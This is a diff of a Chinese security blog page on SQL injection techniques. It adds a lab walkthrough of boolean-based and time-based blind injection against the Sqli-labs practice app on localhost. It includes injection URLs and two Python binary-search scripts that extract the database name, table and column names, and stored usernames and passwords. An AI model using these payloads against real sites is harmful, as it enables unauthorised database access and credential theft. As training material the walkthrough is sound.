@@ -1,4 +1,4 @@
-<!doctype html>
+<!DOCTYPE html>
 
 
 
@@ -10,9 +10,6 @@
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
-<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
-<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
-
 
 
 
@@ -104,7 +101,7 @@
 <meta property="og:url" content="http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html">
 <meta property="og:site_name" content="Hello_C技术博客">
 <meta property="og:description" content="0x01 SQL注入1、连接符:mysql 空格，Oracle ||,sql server +2、黑魔法${IFS}，Linux下可以使用其代替空格">
-<meta property="og:updated_time" content="2017-07-01T13:59:17.451Z">
+<meta property="og:updated_time" content="2017-07-16T11:14:05.480Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入技巧">
 <meta name="twitter:description" content="0x01 SQL注入1、连接符:mysql 空格，Oracle ||,sql server +2、黑魔法${IFS}，Linux下可以使用其代替空格">
@@ -132,31 +129,6 @@
     }
   };
 </script>
-
-<script>
-    (function(){
-        if(''){
-            if (prompt('请输入文章密码') !== ''){
-                alert('密码错误！');
-                history.back();
-            }
-        }
-    })();
-</script>
-
-<style>
-    .pace .pace-progress {
-        background: #1E92FB; /*进度条颜色*/
-        height: 3px;
-    }
-    .pace .pace-progress-inner {
-         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
-    }
-    .pace .pace-activity {
-        border-top-color: #1E92FB;    /*上边框颜色*/
-        border-left-color: #1E92FB;    /*左边框颜色*/
-    }
-</style>
 
 
 
@@ -189,8 +161,6 @@
 
 
 </head>
-
-<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
@@ -290,7 +260,7 @@
             
               <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
             
-            安全导航
+            menu.secpage
           </a>
         </li>
       
@@ -306,9 +276,7 @@
 
  </div>
     </header>
-	
-    
-	
+
     <main id="main" class="main">
       <div class="main-inner">
         <div class="content-wrap">
@@ -410,9 +378,9 @@
                  <i class="fa fa-eye"></i>
                </span>
                
-                 <span class="post-meta-item-text">热度 </span>
+                 <span class="post-meta-item-text">阅读次数 </span>
                
-                 <span class="leancloud-visitors-count">℃</span>
+                 <span class="leancloud-visitors-count"></span>
              </span>
           
 
@@ -429,7 +397,7 @@
                   <span class="post-meta-item-text">字数统计</span>
                 
                 <span title="字数统计">
-                  1,404 字
+                  
                 </span>
               
 
@@ -445,7 +413,7 @@
                   <span class="post-meta-item-text">阅读时长</span>
                 
                 <span title="阅读时长">
-                  8 分钟
+                  
                 </span>
               
             </div>
@@ -563,8 +531,44 @@
 </li>
 </ul>
 <p>获取字段名与字段内容原理一样。</p>
+<p>以Sqli-labs Less8为例，无论输入什么就只有正确和错误，于是可以判断基于布尔的盲注。</p>
+<ul>
+<li>先判断当前数据库的长度<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and length(database())&gt;8 --+</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>发现当值为8的时候，页面就没有显示。那么说明database()的长度是8</p>
+<ul>
+<li>获取数据库名</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- encoding:utf-8 -*-</div><div class="line">import requests</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pos in range(10):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (high + low) &gt;&gt; 1</div><div class="line"></div><div class="line">    while mid &lt; high:</div><div class="line">        #print low, mid, high</div><div class="line">        payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div><div class="line">        url = payload.format(pos,mid)</div><div class="line">        req = requests.get(url)</div><div class="line">        length = len(req.text)</div><div class="line">        if length == 706:  ##返回的长度只有706和722</div><div class="line">            low = mid+1</div><div class="line">        else:</div><div class="line">            high = mid</div><div class="line">        mid = (high+low)&gt;&gt;1</div><div class="line">    key += chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure>
+<ul>
+<li>获取表长度<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1)&gt;0 %23</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>发现当值为6的时候，页面就没有显示。那么说明表的长度是6</p>
+<ul>
+<li><p>获取表名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">和上面类似，只需要把payload修改为下面即可：</div><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div></pre></td></tr></table></figure>
+</li>
+<li><p>获取内容</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select username from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and ascii(substr((select password from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125; %23&quot;</div></pre></td></tr></table></figure>
+</li>
+</ul>
 <h3 id="0x05-基于时间盲注"><a href="#0x05-基于时间盲注" class="headerlink" title="0x05 基于时间盲注"></a>0x05 基于时间盲注</h3><p>If(expr1,expr2,expr3)    判断语句<br>if(database()=’security’,1,2) 判断数据库名是否为security，正确返回1，错误返回2。基于时间的注入和基于布尔差不多，引入了if语句进行判断。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117,sleep(5),NULL) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">| NULL |</div><div class="line">+------+</div><div class="line">1 row in set (0.00 sec)</div><div class="line">mysql&gt; select if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),NULL) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">|    0 |</div><div class="line">+------+</div><div class="line">1 row in set (5.00 sec)</div></pre></td></tr></table></figure>
+<p>以Sqli-labs Less8为例，无论我们怎么输入，输出结果都是You are in ，所以判断为基于时间的盲注。</p>
+<ul>
+<li><p>数据库长度判断</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if(length(database())&gt;9,0,sleep(5)) --+</div></pre></td></tr></table></figure>
+</li>
+<li><p>使用二分法获得数据库名</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># -*- encoding: utf-8 -*-</div><div class="line">import requests</div><div class="line">import time</div><div class="line">key = &quot;&quot;</div><div class="line"></div><div class="line">for pos in range(10):</div><div class="line">    low = 32</div><div class="line">    high = 126</div><div class="line">    mid = (high + low) &gt;&gt; 1</div><div class="line"></div><div class="line">    while mid &lt; high:</div><div class="line">                startTime=time.time()</div><div class="line">                payload = &quot;http://127.0.0.1/sqli-labs/Less-9/?id=1&apos; and if(ascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div><div class="line">                url = payload.format(pos,mid)</div><div class="line">                response=requests.get(url)    #发送请求</div><div class="line">                if time.time() - startTime &lt; 5:    #判断是否延时了5秒</div><div class="line">                    low = mid + 1</div><div class="line">                else:</div><div class="line">                    high = mid</div><div class="line">                mid = (high + low) &gt;&gt; 1</div><div class="line">    key += chr(mid)</div><div class="line">    print key</div></pre></td></tr></table></figure>
+<p>剩余步骤和基于布尔的差不多，只是加了一个if判断语句进行判断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">获取表名：</div><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23</div><div class="line">获取列名：</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select column_name from information_schema.columns where table_name=0x7573657273 limit 4,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div><div class="line">获取内容：</div><div class="line">payload =  &quot;http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and if(ascii(substr((select password from users limit 0,1),&#123;0&#125;,1))&gt;&#123;1&#125;,0,sleep(5)) %23&quot;</div></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -609,9 +613,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/sql注入/" rel="tag"><i class="fa fa-tag"></i> sql注入</a>
+            <a href="/tags/sql注入/" rel="tag"># sql注入</a>
           
-            <a href="/tags/漏洞/" rel="tag"><i class="fa fa-tag"></i> 漏洞</a>
+            <a href="/tags/漏洞/" rel="tag"># 漏洞</a>
           
         </div>
       
@@ -701,6 +705,7 @@
   </div>
 
   <aside id="sidebar" class="sidebar">
+    
     <div class="sidebar-inner">
 
       
@@ -893,8 +898,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<div class="copyright" >
+        <div class="copyright" >
   
   &copy;  2015 - 
   <span itemprop="copyrightYear">2017</span>
@@ -905,11 +909,6 @@
 </div>
 
 
-<div class="powered-by">
-<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
-  本站访客数:<span id="busuanzi_value_site_uv"></span>
-</span>
-</div>
 <div class="powered-by">
   由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
 </div>
@@ -936,9 +935,7 @@
     
 
   </div>
-  
-  <!-- 页面点击小红心 -->
-  <script type="text/javascript" src="/js/src/love.js"></script>
+
   
 
 <script type="text/javascript">
@@ -1051,8 +1048,6 @@
 
 
 
-
-
   
 
 
@@ -1062,7 +1057,7 @@
   
 
   
-  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
   <script>AV.initialize("JCRSaBjs1fI4FctoIzV1M8Kh-gzGzoHsz", "HPfVnkuIFClUv2BUNyy20FlB");</script>
   <script>
     function showTime(Counter) {
@@ -1177,7 +1172,6 @@
   
 
   
-
 
 </body>
 </html>
